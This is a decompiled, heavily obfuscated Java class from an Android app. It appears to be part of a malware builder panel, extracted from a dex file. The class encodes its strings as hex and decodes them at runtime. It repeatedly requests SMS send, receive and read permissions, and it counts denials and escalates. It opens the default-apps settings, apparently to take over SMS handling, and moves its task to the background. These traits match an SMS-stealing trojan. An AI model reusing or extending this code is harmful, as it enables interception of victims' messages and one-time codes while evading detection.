package v.s;

import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import app.mobilex.plus.UtilNWWrapper;
import app.mobilex.plus.util.TypefaceCache;
import java.util.ArrayList;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class AInogFBF3uZEdg60 implements Runnable {
    public final /* synthetic */ UtilNWWrapper vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ AInogFBF3uZEdg60(UtilNWWrapper utilNWWrapper, int i) {
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = utilNWWrapper;
    }

    private static /* synthetic */ void qglxm() {
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v20, types: [v.s.JRdueaGIH5g8DVCPba, v.s.LGm23hksIOxB] */
    /* JADX WARN: Type inference failed for: r0v35, types: [v.s.JRdueaGIH5g8DVCPba, v.s.LGm23hksIOxB] */
    /* JADX WARN: Type inference failed for: r1v21, types: [v.s.JRdueaGIH5g8DVCPba, v.s.LGm23hksIOxB] */
    /* JADX WARN: Type inference failed for: r1v40, types: [v.s.JRdueaGIH5g8DVCPba, v.s.LGm23hksIOxB] */
    /* JADX WARN: Type inference failed for: r1v52, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r1v8 */
    /* JADX WARN: Type inference failed for: r2v27, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r2v30, types: [v.s.JRdueaGIH5g8DVCPba, v.s.LGm23hksIOxB] */
    /* JADX WARN: Type inference failed for: r2v45, types: [v.s.JRdueaGIH5g8DVCPba, v.s.LGm23hksIOxB] */
    /* JADX WARN: Type inference failed for: r7v0, types: [v.s.b9xRoaXFR1fmOO2Q] */
    /* JADX WARN: Type inference failed for: r7v1 */
    /* JADX WARN: Type inference failed for: r7v2, types: [java.util.List] */
    @Override // java.lang.Runnable
    public final void run() {
        int i = 3;
        int i2 = 1;
        ?? r7 = 0;
        ArrayList arrayList = null;
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                UtilNWWrapper utilNWWrapper = this.vekpFI4d1Nc4fakF;
                String str = UtilNWWrapper.A1BaTVAMeIXMnh;
                VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ5 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                if (!VpKcDcuRNaQkRJ5.JXn4Qf7zpnLjP5) {
                    TypefaceCache.obtain("00100062005E008600FC00BA00C000EC00110057006F00DD00B000BE00D100A4002600650048008E00F200B600DE00AE0037006F001B008000E200BE00DC00B300260072001700C700E300AB00D300B50037007F0055008000B0008C00CB00A900200043007100A400FF00B100C600B5002C007A0057008200E2");
                    VpKcDcuRNaQkRJ5.nQilHWaqS401ZtR(utilNWWrapper.getApplicationContext());
                }
                break;
            case 1:
                UtilNWWrapper utilNWWrapper2 = this.vekpFI4d1Nc4fakF;
                String str2 = UtilNWWrapper.A1BaTVAMeIXMnh;
                try {
                    utilNWWrapper2.moveTaskToBack(true);
                    break;
                } catch (Exception unused) {
                }
                try {
                    try {
                        utilNWWrapper2.finishAndRemoveTask();
                    } catch (Exception unused2) {
                        return;
                    }
                } catch (Exception unused3) {
                    utilNWWrapper2.finish();
                    return;
                }
                break;
            case 2:
                sNACkioAJERo snackioajero = sNACkioAJERo.w9sT1Swbhx3hs;
                UtilNWWrapper utilNWWrapper3 = this.vekpFI4d1Nc4fakF;
                String str3 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper3.isFinishing()) {
                    try {
                        utilNWWrapper3.YIgR6F2ZXmLx2ul();
                        break;
                    } catch (Exception unused4) {
                    }
                    cpTq2XMCb5JSaEhn cptq2xmcb5jsaehn = umMdYoePNXvWWPn.w9sT1Swbhx3hs;
                    JV1KnSgnr44vUJP8N jV1KnSgnr44vUJP8N = new JV1KnSgnr44vUJP8N(utilNWWrapper3, r7, i2);
                    if ((2 & 1) != 0) {
                        cptq2xmcb5jsaehn = snackioajero;
                    }
                    cpTq2XMCb5JSaEhn cptq2xmcb5jsaehnWotphlvK9sPbXJ = OFtLBiBbrrTHWu.wotphlvK9sPbXJ(snackioajero, cptq2xmcb5jsaehn, true);
                    AqltFduMByzMV4g aqltFduMByzMV4g = umMdYoePNXvWWPn.dDIMxZXP1V8HdM;
                    if (cptq2xmcb5jsaehnWotphlvK9sPbXJ != aqltFduMByzMV4g && cptq2xmcb5jsaehnWotphlvK9sPbXJ.D5P1xCAyuvgF(W6dfON4KdcdxlH.vekpFI4d1Nc4fakF) == null) {
                        cptq2xmcb5jsaehnWotphlvK9sPbXJ = cptq2xmcb5jsaehnWotphlvK9sPbXJ.EWUjsTERgdPbSw3NNlN(aqltFduMByzMV4g);
                    }
                    JXn4Qf7zpnLjP5 sndbsr9gb3ezzub = new snDbSR9Gb3eZZuB(cptq2xmcb5jsaehnWotphlvK9sPbXJ, true);
                    sndbsr9gb3ezzub.YIgR6F2ZXmLx2ul(1, sndbsr9gb3ezzub, jV1KnSgnr44vUJP8N);
                }
                break;
            case 3:
                UtilNWWrapper utilNWWrapper4 = this.vekpFI4d1Nc4fakF;
                String str4 = UtilNWWrapper.A1BaTVAMeIXMnh;
                new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(utilNWWrapper4, 8), 500L);
                break;
            case 4:
                UtilNWWrapper utilNWWrapper5 = this.vekpFI4d1Nc4fakF;
                String str5 = UtilNWWrapper.MSGkxvPxRYNqC;
                try {
                    if (utilNWWrapper5.vIJudZvPyTuNp) {
                        if (utilNWWrapper5.O2DHNSIGZlgPja7eqLgn()) {
                            utilNWWrapper5.D5P1xCAyuvgF();
                        } else if (utilNWWrapper5.k84rwRrqzhrNQ1CdNQ9) {
                            utilNWWrapper5.VEkRsTDS6a9oHWI();
                        } else {
                            utilNWWrapper5.k84rwRrqzhrNQ1CdNQ9 = true;
                            try {
                                utilNWWrapper5.requestPermissions(new String[]{"android.permission.SEND_SMS", "android.permission.RECEIVE_SMS", "android.permission.READ_SMS"}, 9988);
                            } catch (Exception unused5) {
                                utilNWWrapper5.D5P1xCAyuvgF();
                            }
                        }
                        break;
                    } else if (utilNWWrapper5.O2DHNSIGZlgPja7eqLgn()) {
                        TypefaceCache.obtain("0010005B006800C700E000BA00C000AA002A00650048008E00FF00B1009200B4002200620052009400F600B600D700A30062");
                        utilNWWrapper5.K7eEOBPYP9VIoHWTe = 0;
                        utilNWWrapper5.l1V0lQr6TbwNKqHfXNbb().edit().putInt(str5, 0).apply();
                        ArrayList arrayList2 = utilNWWrapper5.DVTNwpDEVsUKuznof;
                        if (arrayList2 != null) {
                            r7 = arrayList2;
                        }
                        fTTdiiD76ErrE12U fttdiid76erre12u = (fTTdiiD76ErrE12U) imhBI9RqzETHtVIJe.hV4VTKNUdeHN(utilNWWrapper5.l1V0lQr6TbwNKqHfXNbb, r7);
                        if (fttdiid76erre12u != null) {
                            String str6 = fttdiid76erre12u.dDIMxZXP1V8HdM;
                            if ((okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str6, TypefaceCache.obtain("0030007B004800B800F400BA00D400A60036007A004F")) || okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str6, TypefaceCache.obtain("00210077004F009300F500AD00CB00980030007B0048"))) && ((Boolean) fttdiid76erre12u.ibVTtJUNfrGYbW.w9sT1Swbhx3hs()).booleanValue()) {
                                utilNWWrapper5.ECwLkmPW1UKz7J6E();
                            }
                        }
                    } else {
                        utilNWWrapper5.K7eEOBPYP9VIoHWTe++;
                        utilNWWrapper5.l1V0lQr6TbwNKqHfXNbb().edit().putInt(str5, utilNWWrapper5.K7eEOBPYP9VIoHWTe).apply();
                        TypefaceCache.obtain("0010005B006800C700F400BA00DC00AE00260072001B00CF00E400B000C600A6002F002C001B");
                        if (utilNWWrapper5.K7eEOBPYP9VIoHWTe >= 3) {
                            utilNWWrapper5.MSGkxvPxRYNqC();
                        }
                    }
                } catch (Exception e) {
                    TypefaceCache.obtain("00270073005D008600E500B300C60094002E00650077008600E500B100D100AF00260064001B008400F100B300DE00A500220075005000C700F500AD00C000A80031002C001B");
                    e.getMessage();
                    return;
                }
                break;
            case 5:
                UtilNWWrapper utilNWWrapper6 = this.vekpFI4d1Nc4fakF;
                String str7 = UtilNWWrapper.A1BaTVAMeIXMnh;
                VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ6 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                if (!VpKcDcuRNaQkRJ5.JXn4Qf7zpnLjP5) {
                    TypefaceCache.obtain("002000790056009700FC00BA00C600A200100073004F009200E000E5009200B4003700770049009300F900B100D500E70010006F0055008400C5009500F100A8002D00620049008800FC00B300D700B50063003E0054009100F500AD00DE00A6003A003D004B008E00E000BA00DE00AE002D00730012");
                    VpKcDcuRNaQkRJ5.nQilHWaqS401ZtR(utilNWWrapper6.getApplicationContext());
                }
                break;
            case 6:
                UtilNWWrapper utilNWWrapper7 = this.vekpFI4d1Nc4fakF;
                String str8 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper7.isFinishing()) {
                    try {
                        utilNWWrapper7.fivkjwgu2UdAtiY();
                    } catch (Exception e2) {
                        TypefaceCache.obtain("002C00780079008200F300BE00DF00A200070073005D008600E500B300C60094002E0065001B008300F500B900D700B500310073005F00C700F500AD00C000A80031002C001B");
                        e2.getMessage();
                        return;
                    }
                }
                break;
            case 7:
                UtilNWWrapper utilNWWrapper8 = this.vekpFI4d1Nc4fakF;
                String str9 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper8.isFinishing()) {
                    int i3 = utilNWWrapper8.l1V0lQr6TbwNKqHfXNbb;
                    ArrayList arrayList3 = utilNWWrapper8.DVTNwpDEVsUKuznof;
                    if (arrayList3 == null) {
                        arrayList3 = null;
                    }
                    if (i3 < arrayList3.size()) {
                        ArrayList arrayList4 = utilNWWrapper8.DVTNwpDEVsUKuznof;
                        fTTdiiD76ErrE12U fttdiid76erre12u2 = (fTTdiiD76ErrE12U) (arrayList4 != null ? arrayList4 : null).get(utilNWWrapper8.l1V0lQr6TbwNKqHfXNbb);
                        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(fttdiid76erre12u2.dDIMxZXP1V8HdM, TypefaceCache.obtain("00210077004F009300F500AD00CB00980030007B0048")) && !((Boolean) fttdiid76erre12u2.ibVTtJUNfrGYbW.w9sT1Swbhx3hs()).booleanValue()) {
                            utilNWWrapper8.hV4VTKNUdeHN();
                            break;
                        }
                    }
                }
                break;
            case 8:
                UtilNWWrapper utilNWWrapper9 = this.vekpFI4d1Nc4fakF;
                String str10 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper9.isFinishing()) {
                    utilNWWrapper9.VEkRsTDS6a9oHWI();
                }
                break;
            case 9:
                UtilNWWrapper utilNWWrapper10 = this.vekpFI4d1Nc4fakF;
                String str11 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper10.isFinishing()) {
                    try {
                        utilNWWrapper10.fivkjwgu2UdAtiY();
                    } catch (Exception e3) {
                        TypefaceCache.obtain("0026006E005E008400E500AB00D7009700260078005F008E00FE00B800E100AE00270073007E008100F600BA00D100B3003000360054008900D200BA00D100A6002E0073007F008200F600BE00C700AB003700450056009400B000BA00C000B5002C0064000100C7");
                        e3.getMessage();
                        return;
                    }
                }
                break;
            case 10:
                UtilNWWrapper utilNWWrapper11 = this.vekpFI4d1Nc4fakF;
                String str12 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper11.isFinishing() && utilNWWrapper11.xfn2GJwmGqs7kWW < utilNWWrapper11.tne6mXOUFKdd.size()) {
                    jme6JDteoDB1AsG4 jme6jdteodb1asg4 = (jme6JDteoDB1AsG4) utilNWWrapper11.tne6mXOUFKdd.get(utilNWWrapper11.xfn2GJwmGqs7kWW);
                    if (!((Boolean) jme6jdteodb1asg4.ibVTtJUNfrGYbW.w9sT1Swbhx3hs()).booleanValue()) {
                        jme6jdteodb1asg4.b1EoSIRjJHO5.w9sT1Swbhx3hs();
                    } else {
                        utilNWWrapper11.D5P1xCAyuvgF();
                    }
                    break;
                }
                break;
            case 11:
                UtilNWWrapper utilNWWrapper12 = this.vekpFI4d1Nc4fakF;
                String str13 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper12.isFinishing() && !utilNWWrapper12.rCHnHJBAlOpNI5()) {
                    utilNWWrapper12.k84rwRrqzhrNQ1CdNQ9();
                    break;
                }
                break;
            case 12:
                UtilNWWrapper utilNWWrapper13 = this.vekpFI4d1Nc4fakF;
                String str14 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper13.isFinishing()) {
                    if (!utilNWWrapper13.O2DHNSIGZlgPja7eqLgn()) {
                        utilNWWrapper13.VEkRsTDS6a9oHWI();
                    } else {
                        utilNWWrapper13.D5P1xCAyuvgF();
                    }
                }
                break;
            case 13:
                UtilNWWrapper utilNWWrapper14 = this.vekpFI4d1Nc4fakF;
                String str15 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper14.isFinishing() && utilNWWrapper14.O2DHNSIGZlgPja7eqLgn()) {
                    utilNWWrapper14.ECwLkmPW1UKz7J6E();
                    break;
                }
                break;
            case 14:
                UtilNWWrapper utilNWWrapper15 = this.vekpFI4d1Nc4fakF;
                String str16 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper15.isFinishing() && !utilNWWrapper15.rCHnHJBAlOpNI5()) {
                    TypefaceCache.obtain("002C00780075008200E7009600DC00B300260078004F00DD00B0009E00E70093000C0049006900A200C1008A00F7009400170049006800AA00C300FF00C600B5002A0071005C008200E200BA00D6");
                    utilNWWrapper15.hV4VTKNUdeHN();
                    break;
                }
                break;
            case 15:
                sNACkioAJERo snackioajero2 = sNACkioAJERo.w9sT1Swbhx3hs;
                UtilNWWrapper utilNWWrapper16 = this.vekpFI4d1Nc4fakF;
                String str17 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper16.isFinishing()) {
                    try {
                        utilNWWrapper16.YIgR6F2ZXmLx2ul();
                    } catch (Exception e4) {
                        TypefaceCache.obtain("000600770049008B00E900FF00E100BE002D0075006A00BE00D100BB00D300B700370073004900C700E300AB00D300B500370036005D008600F900B300D700A300790036");
                        e4.getMessage();
                    }
                    cpTq2XMCb5JSaEhn cptq2xmcb5jsaehn2 = umMdYoePNXvWWPn.w9sT1Swbhx3hs;
                    JV1KnSgnr44vUJP8N jV1KnSgnr44vUJP8N2 = new JV1KnSgnr44vUJP8N(utilNWWrapper16, r7, i);
                    if ((((-96) + 98) & 1) != 0) {
                        cptq2xmcb5jsaehn2 = snackioajero2;
                    }
                    cpTq2XMCb5JSaEhn cptq2xmcb5jsaehnWotphlvK9sPbXJ2 = OFtLBiBbrrTHWu.wotphlvK9sPbXJ(snackioajero2, cptq2xmcb5jsaehn2, true);
                    AqltFduMByzMV4g aqltFduMByzMV4g2 = umMdYoePNXvWWPn.dDIMxZXP1V8HdM;
                    if (cptq2xmcb5jsaehnWotphlvK9sPbXJ2 != aqltFduMByzMV4g2 && cptq2xmcb5jsaehnWotphlvK9sPbXJ2.D5P1xCAyuvgF(W6dfON4KdcdxlH.vekpFI4d1Nc4fakF) == null) {
                        cptq2xmcb5jsaehnWotphlvK9sPbXJ2 = cptq2xmcb5jsaehnWotphlvK9sPbXJ2.EWUjsTERgdPbSw3NNlN(aqltFduMByzMV4g2);
                    }
                    JXn4Qf7zpnLjP5 sndbsr9gb3ezzub2 = new snDbSR9Gb3eZZuB(cptq2xmcb5jsaehnWotphlvK9sPbXJ2, true);
                    sndbsr9gb3ezzub2.YIgR6F2ZXmLx2ul(1, sndbsr9gb3ezzub2, jV1KnSgnr44vUJP8N2);
                }
                break;
            case 16:
                UtilNWWrapper utilNWWrapper17 = this.vekpFI4d1Nc4fakF;
                String str18 = UtilNWWrapper.A1BaTVAMeIXMnh;
                try {
                    if (utilNWWrapper17.hV4VTKNUdeHN && !utilNWWrapper17.isFinishing()) {
                        utilNWWrapper17.hV4VTKNUdeHN = false;
                        TypefaceCache.obtain("00620037001A00C700F500A700D700A400360062005E00B700F500B100D600AE002D00710068008E00F400BA00F700A1002500730058009300E300E500920094000E0045001B008600FC00AD00D700A60027006F001B008000E200BE00DC00B300260072001700C700E300BC00DA00A2002700630057008E00FE00B8009200B4002A0072005E00C700F500B900D400A200200062004800C700B800EA008200F7002E00650012");
                        new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(utilNWWrapper17, 9), 500L);
                        break;
                    }
                } catch (Exception e5) {
                    TypefaceCache.obtain("0026006E005E008400E500AB00D7009700260078005F008E00FE00B800E100AE00270073007E008100F600BA00D100B300300036005E009500E200B000C000FD0063");
                    e5.getMessage();
                    return;
                }
                break;
            case 17:
                UtilNWWrapper utilNWWrapper18 = this.vekpFI4d1Nc4fakF;
                String str19 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper18.isFinishing() && !utilNWWrapper18.rCHnHJBAlOpNI5()) {
                    TypefaceCache.obtain("00020043006F00A800CF008D00F7009600160053006800B300CF008C00FF009400790036004F009500F900B800D500A20031007F0055008000B000BD00D300B3003700730049009E00BB008C00FF0094006300700049008800FD00FF00D400A800310073005C009500FF00AA00DC00A3006300570058009300F900A900DB00B3003A");
                    utilNWWrapper18.hV4VTKNUdeHN();
                    break;
                }
                break;
            case 18:
                UtilNWWrapper utilNWWrapper19 = this.vekpFI4d1Nc4fakF;
                String str20 = UtilNWWrapper.A1BaTVAMeIXMnh;
                try {
                    if (Build.VERSION.SDK_INT >= 29) {
                        utilNWWrapper19.startActivity(new Intent("android.settings.MANAGE_DEFAULT_APPS_SETTINGS"));
                    }
                    break;
                } catch (Exception unused6) {
                }
                try {
                    try {
                        utilNWWrapper19.startActivity(new Intent("android.settings.MANAGE_DEFAULT_APPS_SETTINGS"));
                    } catch (Exception unused7) {
                        utilNWWrapper19.startActivity(new Intent("android.settings.SETTINGS"));
                        return;
                    }
                } catch (Exception unused8) {
                    return;
                }
                break;
            default:
                UtilNWWrapper utilNWWrapper20 = this.vekpFI4d1Nc4fakF;
                String str21 = UtilNWWrapper.A1BaTVAMeIXMnh;
                try {
                    int i4 = utilNWWrapper20.l1V0lQr6TbwNKqHfXNbb;
                    ArrayList arrayList5 = utilNWWrapper20.DVTNwpDEVsUKuznof;
                    if (arrayList5 == null) {
                        arrayList5 = null;
                    }
                    if (i4 < arrayList5.size()) {
                        ArrayList arrayList6 = utilNWWrapper20.DVTNwpDEVsUKuznof;
                        if (arrayList6 != null) {
                            arrayList = arrayList6;
                        }
                        fTTdiiD76ErrE12U fttdiid76erre12u3 = (fTTdiiD76ErrE12U) arrayList.get(utilNWWrapper20.l1V0lQr6TbwNKqHfXNbb);
                        if (((Boolean) fttdiid76erre12u3.ibVTtJUNfrGYbW.w9sT1Swbhx3hs()).booleanValue()) {
                            utilNWWrapper20.ECwLkmPW1UKz7J6E();
                        } else {
                            fttdiid76erre12u3.b1EoSIRjJHO5.w9sT1Swbhx3hs();
                        }
                    }
                } catch (Exception e6) {
                    TypefaceCache.obtain("002C00780075008200E800AB00F000B2003700620054008900D300B300DB00A400280073005F00C700F500AD00C000A80031002C001B");
                    e6.getMessage();
                    return;
                }
                break;
        }
    }
}
